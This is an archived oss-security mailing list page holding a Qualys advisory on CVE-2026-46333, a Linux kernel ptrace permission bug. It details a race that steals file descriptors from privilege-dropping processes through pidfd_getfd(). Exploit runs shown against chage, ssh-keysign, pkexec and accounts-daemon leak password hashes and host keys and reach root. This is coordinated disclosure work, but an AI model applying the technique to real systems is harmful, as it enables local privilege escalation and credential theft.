@@ -1,0 +1,677 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: Logic bug in the Linux kernel's __ptrace_may_access() function</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="14">[&lt;prev]</a> <a href="16">[next&gt;]</a> <a href="14">[&lt;thread-prev]</a> <a href="../../../2026/05/21/1">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;20260520154548.GB1738&#64;localhost.localdomain&gt;
+Date: Wed, 20 May 2026 15:46:05 +0000
+From: Qualys Security Advisory &lt;qsa&#64;...lys.com&gt;
+To: "oss-security&#64;...ts.openwall.com" &lt;oss-security&#64;...ts.openwall.com&gt;
+Subject: Re: Logic bug in the Linux kernel's __ptrace_may_access() function
+
+
+Qualys Security Advisory
+
+Logic bug in the Linux kernel's __ptrace_may_access() function
+(CVE-2026-46333)
+
+
+========================================================================
+Contents
+========================================================================
+
+Summary
+Analysis
+Case study: chage
+Case study: ssh-keysign
+Case study: pkexec
+Case study: accounts-daemon
+Acknowledgments
+Timeline
+
+
+========================================================================
+Summary
+========================================================================
+
+We discovered a logic bug (an authorization bypass) in the Linux
+kernel's __ptrace_may_access() function. This vulnerability is locally
+exploitable for information disclosure and arbitrary command execution
+as root. To the best of our knowledge, it was introduced in November
+2016 (v4.10-rc1) by commit bfedb58 ("mm: Add a user_ns owner to
+mm_struct and fix ptrace permission checks").
+
+We developed four different exploits for this vulnerability (all of them
+rely on the pidfd_getfd() syscall, which was introduced in January 2020
+(v5.6-rc1), but other exploitation methods might exist):
+
+- An exploit against chage (a set-uid-root or set-gid-shadow binary),
+  which allows a local attacker to disclose the contents of /etc/shadow
+  (the system's password hashes). We successfully tested this exploit on
+  the default installations of Debian 13, Ubuntu 24.04 and 26.04, Fedora
+  43 and 44; other distributions may also be exploitable.
+
+- An exploit against ssh-keysign (a set-uid-root binary), which allows a
+  local attacker to disclose the host's private keys (/etc/ssh/*_key).
+  We successfully tested this exploit on the default installations of
+  Debian 13, Ubuntu 24.04 and 26.04; other distributions may also be
+  exploitable.
+
+- An exploit against pkexec (a set-uid-root binary), which allows a
+  local attacker to execute arbitrary commands as root if the real user
+  of the computer is physically sitting at it (the attacker however can
+  be remotely logged in to the computer, via sshd for example). We
+  successfully tested this exploit on the default installations of
+  Debian 13, Ubuntu Desktop 24.04 and 26.04, Fedora Workstation 43 and
+  44; other distributions may also be exploitable.
+
+- An exploit against accounts-daemon (a root daemon), which allows a
+  local attacker to execute arbitrary commands as root. We successfully
+  tested this exploit on the default installations of Debian 13, Fedora
+  Workstation 43 and 44; other distributions may also be exploitable,
+  but Ubuntu is notably not because it enables the Yama ptrace
+  protection by default (it sets kernel.yama.ptrace_scope to 1).
+
+Please note that we have not exhaustively searched for exploitable
+userland programs (set-uid, set-gid, set-capabilities binaries, and root
+daemons); we simply remembered the four that we found from past research
+projects, and other, possibly better, exploitable programs may exist.
+
+Last-minute note: on Friday, May 15, 2026, we pre-published relevant
+information at <a href="https://www.openwall.com/lists/oss-security/2026/05/15/2">https://www.openwall.com/lists/oss-security/2026/05/15/2</a>
+and <a href="https://www.openwall.com/lists/oss-security/2026/05/15/8">https://www.openwall.com/lists/oss-security/2026/05/15/8</a>.
+
+
+========================================================================
+Analysis
+========================================================================
+
+An unprivileged user who wants to successfully call ptrace(),
+process_vm_readv(), process_vm_writev(), or pidfd_getfd() on a process,
+or access one of this process's sensitive files in /proc/pid, must first
+pass two security checks in __ptrace_may_access():
+
+------------------------------------------------------------------------
+ 276 static int __ptrace_may_access(struct task_struct *task, unsigned int mode)
+ 277 {
+ ...
+ 316         tcred = __task_cred(task);
+ 317         if (uid_eq(caller_uid, tcred-&gt;euid) &amp;&amp;
+ 318             uid_eq(caller_uid, tcred-&gt;suid) &amp;&amp;
+ 319             uid_eq(caller_uid, tcred-&gt;uid)  &amp;&amp;
+ 320             gid_eq(caller_gid, tcred-&gt;egid) &amp;&amp;
+ 321             gid_eq(caller_gid, tcred-&gt;sgid) &amp;&amp;
+ 322             gid_eq(caller_gid, tcred-&gt;gid))
+ 323                 goto ok;
+ ...
+ 328 ok:
+ ...
+ 340         mm = task-&gt;mm;
+ 341         if (mm &amp;&amp;
+ 342             ((get_dumpable(mm) != SUID_DUMP_USER) &amp;&amp;
+ 343              !ptrace_has_cap(mm-&gt;user_ns, mode)))
+ 344             return -EPERM;
+ 345 
+ 346         return security_ptrace_access_check(task, mode);
+ 347 }
+------------------------------------------------------------------------
+
+1/ at lines 317-322, the process's effective, saved, real uids and gids
+must be equal to the unprivileged user's uid and gid;
+
+2/ at lines 341-342, the process's dumpable flag must be equal to
+SUID_DUMP_USER (1).
+
+By default, the kernel automatically sets a process's dumpable flag to
+SUID_DUMP_DISABLE (0) if the process changes one of its uids or gids, to
+prevent an unprivileged user from extracting sensitive information or
+resources from this process. For example, sshd-session changes its root
+uid and gid to an authenticated user's uid and gid, but its memory may
+still contain secret information (private keys and password hashes).
+
+Unfortunately, the check of the process's dumpable flag at line 342 can
+be completely bypassed: if the process's mm pointer is NULL at line 341,
+then the unprivileged user (whose uid and gid are equal to the process's
+uid and gid) can trick __ptrace_may_access() into returning successfully
+at line 346, even if the process's dumpable flag is not actually equal
+to SUID_DUMP_USER (i.e., even if this process used to be privileged).
+
+The kernel sets a process's mm pointer to NULL in do_exit(), at line
+964, when this process is dying:
+
+------------------------------------------------------------------------
+ 896 void __noreturn do_exit(long code)
+ 897 {
+ ...
+ 964         exit_mm();
+ ...
+ 971         exit_files(tsk);
+....
+1019         do_task_dead();
+1020 }
+------------------------------------------------------------------------
+
+The question, then, is: what sensitive resources can an attacker steal
+from a process that fully dropped its privileges (to the attacker's uid
+and gid), after this process's mm pointer was set to NULL at line 964,
+but before this process dies completely at line 1019?
+
+Eventually, we found an answer to this question in the pidfd_getfd()
+syscall:
+
+------------------------------------------------------------------------
+947 SYSCALL_DEFINE3(pidfd_getfd, int, pidfd, int, fd,
+948                 unsigned int, flags)
+949 {
+...
+964         return pidfd_getfd(pid, fd);
+------------------------------------------------------------------------
+910 static int pidfd_getfd(struct pid *pid, int fd)
+911 {
+...
+920         file = __pidfd_fget(task, fd);
+------------------------------------------------------------------------
+872 static struct file *__pidfd_fget(struct task_struct *task, int fd)
+873 {
+...
+881         if (ptrace_may_access(task, PTRACE_MODE_ATTACH_REALCREDS))
+882                 file = fget_task(task, fd);
+------------------------------------------------------------------------
+1123 struct file *fget_task(struct task_struct *task, unsigned int fd)
+1124 {
+....
+1128         if (task-&gt;files)
+1129                 file = __fget_files(task-&gt;files, fd, 0);
+------------------------------------------------------------------------
+
+- if we (attackers) SIGKILL a process immediately after it dropped its
+  privileges to our own uid and gid;
+
+- and if we call pidfd_getfd() on this process after its mm pointer was
+  set to NULL (in do_exit(), at line 964) but before its files pointer
+  is set to NULL (in do_exit(), at line 971);
+
+- then the call to ptrace_may_access() at line 881 succeeds (because the
+  process's uid and gid are equal to our own unprivileged uid and gid at
+  lines 317-322, and because its mm pointer is NULL at line 341 and
+  therefore bypasses the check of the dumpable flag at line 342);
+
+- and we can steal any one of the process's open file descriptors at
+  line 1129, and use it as our own.
+
+
+========================================================================
+Case study: chage
+========================================================================
+
+chage is a set-uid-root or set-gid-shadow binary from the shadow-utils,
+installed by default on most Linux distributions. If we execute it with
+the -l option, then at line 776 it opens /etc/shadow in O_RDONLY mode,
+and at lines 778-779 it drops its privileges to our own uid and gid:
+
+------------------------------------------------------------------------
+726 int main (int argc, char **argv)
+727 {
+...
+753         ruid = getuid ();
+754         rgid = getgid ();
+...
+776         open_files (lflg, &amp;flags);
+777         /* Drop privileges */
+778         if (lflg &amp;&amp; (   (setregid (rgid, rgid) != 0)
+779                      || (setreuid (ruid, ruid) != 0))) {
+------------------------------------------------------------------------
+
+Consequently, if we SIGKILL the chage process immediately after lines
+778-779, and call pidfd_getfd() on this process in a tight loop, then
+eventually we win the race in do_exit() (between line 964 and line 971),
+bypass the check of the dumpable flag in ptrace_may_access(), and can
+steal chage's /etc/shadow file descriptor and read its contents:
+
+------------------------------------------------------------------------
+$ cat /etc/os-release
+PRETTY_NAME="Ubuntu 26.04 LTS"
+
+$ id
+uid=1001(jane) gid=1001(jane) groups=1001(jane)
+
+$ stat /usr/bin/chage
+Access: (2755/-rwxr-sr-x)  Uid: (    0/    root)   Gid: (   42/  shadow)
+
+$ ./exploit-chage
+root:*:20563:0:99999:7:::
+...
+john:$6$zejBXeN4uVNvydnA$hwbwcoT24evWSI4SqM1p8YIInVMtqY2CCE.vfudaG1/mIKayCFraqWIbY0tSIiLFl.8ZrBm86owPU.Xa8HauQ0:20585:0:99999:7:::
+sshd:!*:20585::::::
+jane:$y$j9T$r575buH7G8C84ZHsJRiee/$yyVfFeh/EMowm9GhXXC6TdgUGftwYpB8Uffa/k7VNE9:20585:0:99999:7:::
+------------------------------------------------------------------------
+
+
+========================================================================
+Case study: ssh-keysign
+========================================================================
+
+ssh-keysign is a set-uid-root binary from OpenSSH, installed by default
+on most Linux distributions. Even though EnableSSHKeysign is disabled by
+default in /etc/ssh/ssh_config, at lines 203-205 it opens the host's
+private key files (/etc/ssh/*_key), and at line 211 it drops its
+privileges:
+
+------------------------------------------------------------------------
+176 main(int argc, char **argv)
+177 {
+...
+203         key_fd[i++] = open(_PATH_HOST_ECDSA_KEY_FILE, O_RDONLY);
+204         key_fd[i++] = open(_PATH_HOST_ED25519_KEY_FILE, O_RDONLY);
+205         key_fd[i++] = open(_PATH_HOST_RSA_KEY_FILE, O_RDONLY);
+206 
+207         if ((pw = getpwuid(getuid())) == NULL)
+208                 fatal("getpwuid failed");
+209         pw = pwcopy(pw);
+210 
+211         permanently_set_uid(pw);
+...
+224         if (options.enable_ssh_keysign != 1)
+225                 fatal("ssh-keysign not enabled in %s",
+226                     _PATH_HOST_CONFIG_FILE);
+------------------------------------------------------------------------
+
+Consequently, if we SIGKILL ssh-keysign immediately after line 211, and
+call pidfd_getfd() in a loop, then we can steal any one of ssh-keysign's
+/etc/ssh/*_key file descriptors and read its contents:
+
+------------------------------------------------------------------------
+$ cat /etc/os-release
+PRETTY_NAME="Ubuntu 26.04 LTS"
+
+$ id
+uid=1001(jane) gid=1001(jane) groups=1001(jane)
+
+$ stat /usr/lib/openssh/ssh-keysign
+Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+
+$ ./exploit-ssh-keysign 3
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
+...
+
+$ ./exploit-ssh-keysign 4
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+...
+
+$ ./exploit-ssh-keysign 5
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+...
+------------------------------------------------------------------------
+
+
+========================================================================
+Case study: pkexec
+========================================================================
+
+pkexec is a set-uid-root binary from the polkit package, installed by
+default on most Linux desktop distributions. On Debian for example, an
+"allow_active" user (a user who is physically sitting at the computer)
+can execute /usr/libexec/gsd-backlight-helper as root, or as any other
+user, via pkexec --user:
+
+------------------------------------------------------------------------
+$ cat /etc/os-release
+PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
+
+$ cat /usr/share/polkit-1/actions/org.gnome.settings-daemon.plugins.power.policy
+    ...
+    &lt;defaults&gt;
+      &lt;allow_any&gt;no&lt;/allow_any&gt;
+      &lt;allow_inactive&gt;no&lt;/allow_inactive&gt;
+      &lt;allow_active&gt;yes&lt;/allow_active&gt;
+    &lt;/defaults&gt;
+    &lt;annotate key="org.freedesktop.policykit.exec.path"&gt;/usr/libexec/gsd-backlight-helper&lt;/annotate&gt;
+    ...
+------------------------------------------------------------------------
+ 469 main (int argc, char *argv[])
+ 470 {
+ ...
+ 585           opt_user = g_strdup (argv[n]);
+ ...
+ 641   rc = getpwnam_r (opt_user, &amp;pwstruct, pwbuf, sizeof pwbuf, &amp;pw);
+....
+1024   if (!fdwalk_close_on_exec (3))
+....
+1086   (void) setregid (pw-&gt;pw_gid, pw-&gt;pw_gid);
+1087   (void) setreuid (pw-&gt;pw_uid, pw-&gt;pw_uid);
+....
+1109   if (execv (path, exec_argv) != 0)
+------------------------------------------------------------------------
+
+- between line 641 and line 1024, pkexec connects to the system dbus,
+  and authenticates this connection as root (with its SCM_CREDENTIALS);
+
+- at line 1024, pkexec sets the close-on-exec flag on all open file
+  descriptors &gt;= 3, including the file descriptor that is connected to
+  the system dbus (i.e., it will be closed later, at line 1109);
+
+- at lines 1086-1087, pkexec fully drops its privileges (to the user
+  specified by the --user option at line 585).
+
+Consequently:
+
+- if we (attackers) execute pkexec with our own user as the --user
+  option, and SIGKILL pkexec immediately after it drops its privileges
+  to our uid and gid (at lines 1086-1087);
+
+- then, if we call pidfd_getfd() in a tight loop, we can steal pkexec's
+  connection to the system dbus, which is already authenticated as root;
+
+- and send a request to systemd (pid 1) over this connection to start a
+  transient unit (StartTransientUnit) and execute an arbitrary command
+  with full root privileges (ExecStart=/bin/sh -c 'id&gt;&gt;/tmp/pwned' for
+  example).
+
+At first sight, it would seem that only a real "allow_active" user can
+carry out this attack against pkexec; but not necessarily so, thanks to
+Pumpkin Chang's clever "Trick 1 - Abuse Rule Limitations" from:
+
+  <a href="https://u1f383.github.io/linux/2025/05/25/dbus-and-polkit-introduction.html" rel="nofollow">https://u1f383.github.io/linux/2025/05/25/dbus-and-polkit-introduction.html</a>
+
+In the following proof of concept, we (attackers) log in to the target
+computer as the user jane, remotely via sshd, while the real user jane
+is physically sitting at the computer (tty1). Our attempt at executing
+pkexec naturally fails, because we are not an "allow_active" user; but
+if we make the same attempt via systemd-run, it surprisingly succeeds.
+We can therefore attack pkexec and execute arbitrary commands as root,
+even though we are not really an "allow_active" user:
+
+------------------------------------------------------------------------
+&gt; ssh jane&#64;...get
+
+$ cat /etc/os-release
+PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
+
+$ id
+uid=1001(jane) gid=1001(jane) groups=1001(jane),100(users)
+
+$ w
+ 17:39:07 up  4:43,  2 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
+jane     pts/0    192.168.56.1     16:44    3.00s  0.21s  0.01s w
+jane     tty1     -                12:56    4:42m  0.05s  0.05s -bash
+
+$ stat /usr/bin/pkexec
+Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+
+$ /usr/bin/pkexec --user jane /usr/libexec/gsd-backlight-helper
+Error executing command as another user: Not authorized
+This incident has been reported.
+
+$ systemd-run --user -- /bin/sh -c '/usr/bin/pkexec --user jane /usr/libexec/gsd-backlight-helper &gt; ~/output 2&gt;&amp;1'
+Running as unit: run-p1550-i1850.service; invocation ID: 4e02cd9e5d7f455ea077db849fddd1e1
+
+$ cat ~/output
+This program can only be used by the root user
+
+$ systemd-run --user -- /bin/sh -c '~/exploit-pkexec &gt; ~/output 2&gt;&amp;1'
+Running as unit: run-p1567-i1867.service; invocation ID: e014d0fea3bb42d188e290c6d4eceed0
+
+$ cat ~/output
+Unit path is "/org/freedesktop/systemd1/job/4235".
+
+$ cat /tmp/pwned
+uid=0(root) gid=0(root) groups=0(root)
+------------------------------------------------------------------------
+
+
+========================================================================
+Case study: accounts-daemon
+========================================================================
+
+accounts-daemon is a root daemon from the accountsservice package,
+installed by default on most Linux desktop distributions. In the strace
+output below, we (attackers) send a request to accounts-daemon, over
+dbus, to set our avatar (SetIconFile) to /etc/issue (for example):
+
+------------------------------------------------------------------------
+617  close_range(3, 4294967295, CLOSE_RANGE_CLOEXEC) = 0
+...
+728  setgid(1001)                      = 0
+729  setuid(1001)                      = 0
+730  execve("/bin/cat", ["/bin/cat", "/etc/issue"], 0x7fff22a14f58 /* 13 vars */ &lt;unfinished ...&gt;
+------------------------------------------------------------------------
+
+- at line 617, accounts-daemon sets the close-on-exec flag on all file
+  descriptors &gt;= 3, including its connection to the system dbus, which
+  is authenticated as root (i.e., it will be closed later, at line 730);
+
+- at lines 728-729, accounts-daemon fully drops its privileges (to our
+  own uid and gid).
+
+Consequently:
+
+- if we send a request to accounts-daemon to reset our avatar, and if we
+  SIGKILL accounts-daemon immediately after it drops its privileges (at
+  lines 728-729) but before it executes /bin/cat (at line 730);
+
+- then, if we call pidfd_getfd() in a tight loop, we can steal
+  accounts-daemon's connection to the system dbus, which is still
+  authenticated as root;
+
+- and send a request to systemd over this connection to start a
+  transient unit and execute an arbitrary command with full root
+  privileges.
+
+------------------------------------------------------------------------
+$ cat /etc/os-release
+PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
+
+$ id
+uid=1001(jane) gid=1001(jane) groups=1001(jane),100(users)
+
+$ ps -ef | grep accounts-daemon
+root         578       1  0 06:07 ?        00:00:00 /usr/libexec/accounts-daemon
+
+$ ./exploit-accounts-daemon
+daemon_pid 578 
+cat_pid? 902 (accounts-daemon) R 578 578 578 0 -1 4194368 0 0 0 0 0 0 0 
+cat_pid? 902 (accounts-daemon) R 578 578 578 0 -1 4194368 24 0 0 0 0 0 0
+cat_pid? 902 (accounts-daemon) R 578 578 578 0 -1 4194368 32 0 0 0 0 0 0
+cat_pid? 903 (accounts-daemon) R 902 578 578 0 -1 4194368 0 0 0 0 0 0 0 
+cat_pid! 903 (accounts-daemon) R 902 578 578 0 -1 4194368 0 0 0 0 0 0 0 
+tries 165
+fd 4
+tries 20
+Error: GDBus.Error:org.freedesktop.Accounts.Error.Failed: copying file '/etc/issue' to '/var/lib/AccountsService/icons/jane' failed: unknown reason
+died in dbus: 60
+
+$ cat /tmp/pwned
+uid=0(root) gid=0(root) groups=0(root)
+------------------------------------------------------------------------
+
+On Fedora, SELinux prevents accounts-daemon from starting a transient
+systemd unit, but we can send a request to another dbus daemon instead;
+for example, we can send a request to accounts-daemon itself, to set an
+administrator's password (SetPassword) of our choice, and then su to
+this administrator, and then sudo to root:
+
+------------------------------------------------------------------------
+$ cat /etc/os-release
+PRETTY_NAME="Fedora Linux 44 (Workstation Edition)"
+
+$ id
+uid=1001(jane) gid=1001(jane) groups=1001(jane) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+$ ps -ef | grep accounts-daemon
+root         941       1  0 09:17 ?        00:00:00 /usr/libexec/accounts-daemon
+
+$ su -l john
+Password: RadicalEdward
+su: Authentication failure
+
+$ ./exploit-accounts-daemon
+daemon_pid 941 
+cat_pid? 2749 (accounts-daemon) R 941 941 941 0 -1 4194368 7 0 0 0 0 0 0
+cat_pid? 2749 (accounts-daemon) R 941 941 941 0 -1 4194368 23 0 0 0 0 0 
+cat_pid? 2749 (accounts-daemon) R 941 941 941 0 -1 4194368 38 0 0 0 0 0 
+cat_pid? 2750 (accounts-daemon) R 2749 941 941 0 -1 4194368 0 0 0 0 0 0 
+cat_pid! 2750 (accounts-daemon) R 2749 941 941 0 -1 4194368 0 0 0 0 0 0 
+tries 245
+fd 4
+tries 12
+Error: GDBus.Error:org.freedesktop.Accounts.Error.Failed: copying file '/etc/issue' to '/var/lib/AccountsService/icons/jane' failed: unknown reason
+died in dbus: 59
+
+$ su -l john
+Password: RadicalEdward
+
+$ id
+uid=1000(john) gid=1000(john) groups=1000(john),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+$ sudo -i
+[sudo] password for john: RadicalEdward
+
+# id
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+------------------------------------------------------------------------
+
+
+========================================================================
+Acknowledgments
+========================================================================
+
+We thank the security&#64;...nel (in particular, Linus Torvalds, Christian
+Brauner, Kees Cook, Oleg Nesterov) for their work on this vulnerability.
+We also thank the linux-distros&#64;...nwall (in particular, Solar Designer,
+Sam James, Salvatore Bonaccorso) for their help with this disclosure.
+
+This advisory was written in loving memory of CVE-2001-1384 (by Rafal
+"nergal" Wojtczuk) and CVE-2003-0127 (by Wojciech "cliph" Purczynski).
+
+
+========================================================================
+Timeline
+========================================================================
+
+2026-05-11: Advisory and proof of concept sent to the security&#64;...nel.
+
+2026-05-14: Patch committed publicly (31e62c2) by Linus Torvalds.
+
+2026-05-14: Heads-up sent to the private linux-distros&#64;...nwall.
+
+2026-05-15: Heads-up sent to the public oss-security&#64;...nwall.
+
+2026-05-20: Advisory published.
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
